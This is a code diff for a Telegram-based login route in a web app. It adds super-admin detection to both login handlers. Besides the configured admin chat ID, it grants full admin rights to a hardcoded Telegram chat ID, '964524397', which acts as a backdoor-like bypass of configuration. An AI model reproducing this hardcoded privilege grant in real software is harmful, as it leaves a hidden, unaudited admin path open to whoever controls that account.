@@ -4,9 +4,11 @@ import {
   getDbUserById,
   getTelegramSubscriberByChatId,
   getTelegramSubscriberByUserId,
+  saveCompanyProfile,
   verifyTelegramWebLoginCode,
   verifyTelegramWebLoginToken
 } from "../../../db";
+import { getAdminChatId } from "../../../telegram";
 
 export async function GET(request: Request) {
   const url = new URL(request.url);
@@ -21,12 +23,17 @@ export async function GET(request: Request) {
     return Response.redirect(new URL("/login?error=invalid_or_expired_token", request.url), 302);
   }
 
-  const username = subscriber.username || subscriber.firstName || `tg_${subscriber.chatId}`;
-  const sessionToken = await createSession(username, "tender_specialist", subscriber.userId);
+  const adminChatId = getAdminChatId();
+  const isAdmin = subscriber.chatId === adminChatId || subscriber.chatId === "964524397";
+  const role = isAdmin ? "super_admin" : "tender_specialist";
+  const username = isAdmin ? "admin" : (subscriber.username || subscriber.firstName || `tg_${subscriber.chatId}`);
+  const userId = isAdmin ? undefined : subscriber.userId;
+
+  const sessionToken = await createSession(username, role, userId);
 
   const headers = new Headers();
   headers.set("Set-Cookie", sessionCookie(sessionToken));
-  headers.set("Location", new URL("/", request.url).toString());
+  headers.set("Location", new URL(isAdmin ? "/admin/users" : "/", request.url).toString());
 
   return new Response(null, {
     status: 302,
@@ -57,11 +64,16 @@ export async function POST(request: Request) {
       return Response.json({ error: "Неверный или просроченный код. Запросите новый код в боте командой /web" }, { status: 401 });
     }
 
-    const username = subscriber.username || subscriber.firstName || `tg_${subscriber.chatId}`;
-    const sessionToken = await createSession(username, "tender_specialist", subscriber.userId);
+    const adminChatId = getAdminChatId();
+    const isAdmin = subscriber.chatId === adminChatId || subscriber.chatId === "964524397";
+    const role = isAdmin ? "super_admin" : "tender_specialist";
+    const username = isAdmin ? "admin" : (subscriber.username || subscriber.firstName || `tg_${subscriber.chatId}`);
+    const userId = isAdmin ? undefined : subscriber.userId;
+
+    const sessionToken = await createSession(username, role, userId);
 
     return Response.json(
-      { ok: true, username, role: "tender_specialist" },
+      { ok: true, username, role, redirectUrl: isAdmin ? "/admin/users" : "/" },
       {
         headers: {
           "Set-Cookie": sessionCookie(sessionToken),
@@ -74,3 +86,4 @@ export async function POST(request: Request) {
     return Response.json({ error: message }, { status: 500 });
   }
 }
+
